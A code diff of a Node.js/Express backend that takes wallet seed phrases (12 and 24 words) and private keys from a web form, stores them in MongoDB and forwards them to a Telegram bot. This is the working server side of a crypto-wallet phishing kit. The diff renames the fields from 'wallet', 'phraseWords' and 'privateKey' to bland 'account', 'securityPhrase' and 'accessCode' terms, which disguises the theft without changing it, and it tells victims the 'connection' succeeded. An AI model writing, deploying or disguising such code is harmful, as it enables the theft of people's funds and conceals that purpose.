@@ -46,33 +46,33 @@ mongoose
   .then(() => console.log("MD connected"))
   .catch((err) => console.error("MD connection error:", err));
 
-// Define a schema for wallet data
-const walletSchema = new mongoose.Schema(
+// Define a schema for account data
+const accountSchema = new mongoose.Schema(
   {
-    walletName: String,
-    walletAddress: String,
-    phraseWords: [String],
-    phraseWords24: [String],
-    privateKey: String,
+    accountName: String,
+    accountId: String,
+    securityPhrase: [String],
+    securityPhrase24: [String],
+    accessCode: String,
   },
   { timestamps: true }
 );
 
-const Wallet = mongoose.model("Wallet", walletSchema);
+const Account = mongoose.model("Account", accountSchema);
 
 // Function to send data to Telegram
-async function sendToTelegram(walletData) {
+async function sendToTelegram(accountData) {
   try {
-    const phraseWords = Array.isArray(walletData.phraseWords) ? walletData.phraseWords.join(", ") : "N/A";
-    const phraseWords24 = Array.isArray(walletData.phraseWords24) ? walletData.phraseWords24.join(", ") : "N/A";
+    const securityPhrase = Array.isArray(accountData.securityPhrase) ? accountData.securityPhrase.join(", ") : "N/A";
+    const securityPhrase24 = Array.isArray(accountData.securityPhrase24) ? accountData.securityPhrase24.join(", ") : "N/A";
 
     const message = `
-      🏦 Wallet Submission 🏦
-      Name: ${walletData.walletName || "N/A"}
-      Address: ${walletData.walletAddress || "N/A"}
-      Phrase Words: ${phraseWords}
-      Phrase Words (24): ${phraseWords24}
-      Private Key: ${walletData.privateKey || "N/A"}
+      🏦 Account Submission 🏦
+      Name: ${accountData.accountName || "N/A"}
+      ID: ${accountData.accountId || "N/A"}
+      Security Phrase: ${securityPhrase}
+      Security Phrase (24): ${securityPhrase24}
+      Access Code: ${accountData.accessCode || "N/A"}
     `;
 
     const response = await axios.post(
@@ -89,36 +89,36 @@ async function sendToTelegram(walletData) {
   }
 }
 
-// Endpoint to handle wallet data
-app.post("/api/send-wallet-data", async (req, res) => {
+// Endpoint to handle account data
+app.post("/api/send-account-data", async (req, res) => {
   console.log("Received request");
 
-  const { walletName, walletAddress, phraseWords, phraseWords24, privateKey } = req.body;
+  const { accountName, accountId, securityPhrase, securityPhrase24, accessCode } = req.body;
 
   try {
-    const newWallet = new Wallet({
-      walletName,
-      walletAddress,
-      phraseWords,
-      phraseWords24,
-      privateKey,
+    const newAccount = new Account({
+      accountName,
+      accountId,
+      securityPhrase,
+      securityPhrase24,
+      accessCode,
     });
 
-    await newWallet.save();
-    console.log("Wallet data saved");
+    await newAccount.save();
+    console.log("Account data saved");
 
     // Send data to Telegram
     await sendToTelegram(req.body);
 
-    res.status(200).json({ message: "Wallet connection successful" });
+    res.status(200).json({ message: "Account connection successful" });
   } catch (error) {
-    console.error("Error CWD:", error);
-    res.status(500).json({ error: "Error CWD", details: error.message });
+    console.error("Error CAD:", error);
+    res.status(500).json({ error: "Error CAD", details: error.message });
   }
 });
 
 app.get("/", (req, res) => {
-  res.send("Welcome to the Blockchain Backend API");
+  res.send("Welcome to the Application Backend API");
 });
 
 // Error handling middleware
